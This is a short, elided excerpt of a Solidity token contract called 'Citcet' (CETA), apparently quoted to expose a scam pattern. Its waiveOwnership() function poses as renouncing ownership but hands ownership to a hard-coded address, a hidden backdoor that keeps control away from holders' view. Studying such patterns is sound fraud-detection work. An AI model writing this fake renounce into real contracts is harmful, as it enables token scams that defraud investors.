...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xDc79cd0F39B73B6862765b015544A32DBa1d209C);
    }
...
contract CETA is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Citcet";
    string private _symbol = "Ceta";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x6076ddA0d53A57792638883fb77571E56B66B73e);
    address payable public teamWalletAddress = payable(0x0A111a4b17159b556CF8bf1B2d563bd8ff63954F);
